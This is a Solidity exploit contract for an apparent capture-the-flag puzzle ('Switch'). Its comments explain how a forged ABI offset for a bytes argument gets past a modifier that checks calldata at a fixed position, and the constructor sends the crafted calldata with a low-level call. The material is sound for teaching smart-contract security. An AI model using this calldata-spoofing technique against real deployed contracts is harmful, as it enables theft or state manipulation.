// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SwitchHack {
    constructor(address _switch) {
        /* 
        flipSwitch() = 0x30c13ade
        turnSwitchOff() = 0x20606e15
        turnSwitchOn() = 0x76227e12
        bytes memory is encoded as follows:
          first 32 bytes: location of data part in the arguments block
            arguments block = part of calldata after the first 4 bytes (function selector)
          first 32 bytes from location of data part: length of bytes n 
          next n bytes: bytes data itself

        For a simple call to _switch.flipSwitch(abi.encode(_switch.turnSwitchOff.selector)) would look like this then:
        0x
    00: 30c13ade
    04: 0000000000000000000000000000000000000000000000000000000000000020  - arguments block starts here. data part for `_data` starts at argument block's 32 bytes (0x20)
    36: 0000000000000000000000000000000000000000000000000000000000000004 - data part for `_data` starts here. first 32 bytes is length - 0x04
    68: 20606e15 - next 4 bytes is the bytes data itself - function selector for turnSwitchOff()

        But this would revert because we need to call turnSwitchOn() instead of turnSwitchOff().
        But the modifier onlyOff() checks that the calldata at position 68 (first element of _data) is equal to turnSwitchOff() (0x20606e15)
        So we need to keep the 4 bytes from offset 68 to be turnSwitchOff() unchanged, but change the element of _data into turnSwitchOn() (0x76227e12), while maintaining the bytes memory abi encoding.
        We can do this by changing the location of the data part of _data to another offset, and point to that offset in the arguments block.
        This is how it could look like:
        0x
    00: 30c13ade
    04: 0000000000000000000000000000000000000000000000000000000000000044 - data part for `_data` starts at argument block's 68 bytes (0x20)
    36: 0000000000000000000000000000000000000000000000000000000000000000 - leave empty bytes
    68: 20606e15 - turnSwitchOff() selector to satisfy onlyOff() modifier
    72: 0000000000000000000000000000000000000000000000000000000000000004 - data part for `_data` starts here. first 32 bytes is length - 0x04
    104: 76227e12 - next 4 bytes is the bytes data itself - function selector for turnSwitchOn()

        Thus calldata = 0x30c13ade0000000000000000000000000000000000000000000000000000000000000044000000000000000000000000000000000000000000000000000000000000000020606e15000000000000000000000000000000000000000000000000000000000000000476227e12
        */
        bytes
            memory _calldata = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000044000000000000000000000000000000000000000000000000000000000000000020606e15000000000000000000000000000000000000000000000000000000000000000476227e12";
        address(_switch).call(_calldata);
    }
}
